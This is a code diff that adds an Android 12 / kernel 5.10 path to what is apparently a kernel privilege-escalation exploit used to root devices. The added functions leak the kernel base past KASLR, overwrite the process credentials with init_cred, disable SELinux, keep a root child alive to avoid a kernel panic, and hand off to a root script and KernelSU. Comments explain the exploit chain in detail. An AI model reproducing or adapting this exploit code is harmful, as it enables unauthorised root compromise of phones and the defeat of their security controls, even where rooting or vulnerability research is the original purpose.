@@ -1139,6 +1139,205 @@ static int verify_leaf_dir_stage(void *context) {
   return 0;
 }
 
+/* ---- eqs / android12-5.10 path -------------------------------------------
+ * The generic W1/W2/W3 chain above relies on the compact (6.1) / rb_node (6.6)
+ * pselect route and on perf_find_task() for the victim task. Neither is usable
+ * on eqs: the route is not armed (no SIGALRM -> no dangling pi_blocked_on) and
+ * the payload fake_lock never lands. So the 5.10 target runs the device-proven
+ * standalone sequence instead (eqs_source/src/main.c run_direct_root_stage()):
+ * KASLR leak -> read __per_cpu_offset[cpu] -> read __entry_task -> install
+ * init_cred into real_cred/cred -> disable SELinux. The KernelSU hand-off stays
+ * the same as the generic path (root script + ksud late-load). */
+
+/* Only the uid is checked: the cred install necessarily clobbers init_cred+8
+ * (gid/suid) with the shape-0 collateral store, so plain `id` exits non-zero on
+ * the unresolvable gid even though uid/euid are 0. */
+static int eqs_check_uid_zero(void) {
+  pid_t child = fork();
+  if (child < 0) {
+    return 0;
+  }
+  if (child == 0) {
+    execl("/system/bin/id", "id", "-u", (char *)NULL);
+    _exit(127);
+  }
+  int status = 0;
+  for (;;) {
+    pid_t got = waitpid(child, &status, 0);
+    if (got == child) {
+      break;
+    }
+    if (got < 0 && errno == EINTR) {
+      continue;
+    }
+    return 0;
+  }
+  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
+}
+
+/* Detach a spawned root helper from the exploit's stdio so it can never hold
+ * the adb shell pipe open (the helper writes its own log file). */
+static void eqs_detach_stdio(void) {
+  int devnull = open("/dev/null", O_RDWR);
+  if (devnull >= 0) {
+    dup2(devnull, STDIN_FILENO);
+    dup2(devnull, STDOUT_FILENO);
+    dup2(devnull, STDERR_FILENO);
+    if (devnull > STDERR_FILENO) {
+      close(devnull);
+    }
+  }
+}
+
+static int eqs_spawn_root_script(void) {
+  unlink(g_ksu_log_path);
+  pid_t worker = fork();
+  if (worker == 0) {
+    if (setsid() < 0) _exit(1);
+    eqs_detach_stdio();
+    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
+    _exit(1);
+  }
+  if (worker < 0) {
+    pr_warning("eqs root script fork failed errno=%d\n", errno);
+    return 0;
+  }
+  pr_success("eqs root script worker pid=%d\n", worker);
+  return 1;
+}
+
+/* A process holding the raw init_cred install adds two references the kernel
+ * never took, so exit_creds() would drop init_cred.usage by 2 and eventually
+ * free the static init_cred (panic ~25s after exit). fork() takes the normal
+ * get_cred() references, so one parked root child keeps usage positive. */
+static int eqs_spawn_keepalive(void) {
+  pid_t keep = fork();
+  if (keep == 0) {
+    setsid();
+    eqs_detach_stdio();
+    for (;;) {
+      sleep(30);
+    }
+  }
+  if (keep < 0) {
+    pr_warning("eqs keepalive fork failed errno=%d\n", errno);
+    return 0;
+  }
+  pr_success("eqs root keepalive forked pid=%d\n", keep);
+  return 1;
+}
+
+static int run_eqs_exploit(void) {
+  pr_success("eqs/5.10 target selected (compact_waiter=%u image_base=%016llx)\n",
+             (unsigned)active_offsets->compact_waiter,
+             (unsigned long long)active_image_text_base());
+
+  TIMER("eqs leak start");
+  if (!slide_leak_kernel_base()) {
+    pr_error("eqs slide KASLR leak failed\n");
+    return 1;
+  }
+  TIMER("eqs leak done");
+
+  if (getenv("GHOSTLOCK_LEAK_ONLY") || getenv("EQS_LEAK_ONLY")) {
+    pr_success("eqs-leak-only: stopping before the credential stage\n");
+    return 0;
+  }
+
+  TIMER("eqs stage-2 start");
+  if (!slide_eqs_root_stage()) {
+    pr_error("eqs stage-2 did not produce uid=0/euid=0\n");
+    return 2;
+  }
+  TIMER("eqs stage-2 done");
+
+  int have_root = getuid() == 0 && geteuid() == 0;
+  dprintf(STDOUT_FILENO, "[+] eqs-root-reached root=%d uid=%u euid=%u "
+                         "gid=%u egid=%u\n",
+          have_root, getuid(), geteuid(), getgid(), getegid());
+  /* Written immediately: the root script / ksud poll can still trip the known
+   * post-exit instability, and this is the durable proof of the cred install. */
+  {
+    int rfd = open("/data/local/tmp/eqs_result.txt",
+                   O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (rfd >= 0) {
+      dprintf(rfd, "root=%d id_u_ok=pending uid=%u euid=%u gid=%u egid=%u "
+                   "selinux_enforcing=%d\n",
+              have_root, getuid(), geteuid(), getgid(), getegid(),
+              check_selinux_off() ? 0 : 1);
+      fsync(rfd);
+      close(rfd);
+    }
+  }
+  if (have_root && !getenv("GHOSTLOCK_NO_KEEPALIVE")) {
+    eqs_spawn_keepalive();
+  }
+  if (getenv("GHOSTLOCK_SKIP_HANDOFF")) {
+    pr_success("eqs hand-off skipped (GHOSTLOCK_SKIP_HANDOFF): uid=%u euid=%u\n",
+               getuid(), geteuid());
+    return have_root ? 0 : 2;
+  }
+  if (have_root) {
+    eqs_spawn_root_script();
+  }
+
+  /* Same ksud/root-script hand-off as the generic path. `id -u` is used rather
+   * than `id`: the cred collateral clobbers init_cred+8 (gid/suid), so plain
+   * `id` exits non-zero on the unresolvable gid even though uid/euid are 0. */
+  int id_ok = eqs_check_uid_zero();
+  int kernelsu_ready = 0;
+  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
+    usleep(100000);
+  }
+  int ksu_log_loaded = 0;
+  int ksu_log_failed = 0;
+  for (int i = 0; i < 60 && !ksu_log_failed && !ksu_log_loaded; i++) {
+    FILE *lf = fopen(g_ksu_log_path, "r");
+    if (lf) {
+      char line[256];
+      while (fgets(line, sizeof(line), lf)) {
+        if (strstr(line, "[+] KernelSU module loaded") ||
+            strstr(line, "[+] kernelsu already loaded"))
+          ksu_log_loaded = 1;
+        if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
+      }
+      fclose(lf);
+    }
+    if (!ksu_log_failed && !ksu_log_loaded) usleep(500000);
+  }
+  kernelsu_ready = kernelsu_ready || ksu_log_loaded;
+
+  if (kernelsu_ready)
+    pr_success("KernelSU ready\n");
+  else if (ksu_log_failed)
+    pr_warning("KernelSU module load failed\n");
+  else
+    pr_warning("eqs temporary root ready; KernelSU module load pending\n");
+
+  pr_success("eqs-root-summary root=%d id=%d uid=%u euid=%u gid=%u egid=%u "
+             "selinux_enforcing=%d\n",
+             have_root, id_ok, getuid(), geteuid(), getgid(), getegid(),
+             check_selinux_off() ? 0 : 1);
+  dprintf(STDOUT_FILENO, "[+] eqs-root-summary root=%d id=%d uid=%u euid=%u "
+                         "selinux_enforcing=%d\n",
+          have_root, id_ok, getuid(), geteuid(), check_selinux_off() ? 0 : 1);
+  /* Persistent record: the credential install makes later stdio unreliable and
+   * the known post-exit panic can drop the last adb lines. */
+  {
+    int rfd = open("/data/local/tmp/eqs_result.txt",
+                   O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (rfd >= 0) {
+      dprintf(rfd, "root=%d id_u_ok=%d uid=%u euid=%u gid=%u egid=%u "
+                   "selinux_enforcing=%d kernelsu=%d\n",
+              have_root, id_ok, getuid(), geteuid(), getgid(), getegid(),
+              check_selinux_off() ? 0 : 1, kernelsu_ready);
+      fsync(rfd);
+      close(rfd);
+    }
+  }
+  return have_root ? 0 : 2;
+}
+
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
   disable_rseq_for_thread();
@@ -1160,6 +1359,14 @@ int run_exploit(int argc, char **argv) {
 
   timer_reset();
   TIMER("exploit start");
+
+  /* android12-5.10 (eqs) takes the dedicated armed-slide path; every other
+   * target keeps the compact/rb_node W1/W2/W3 chain unchanged. */
+  if (slide_eqs_is_active()) {
+    int rc = run_eqs_exploit();
+    TIMER("exploit complete");
+    return rc;
+  }
 
   /* W1: disable SELinux before task discovery. untrusted_app may not be able
    * to read enforce while it is still enforcing, so attempt W1 regardless. */
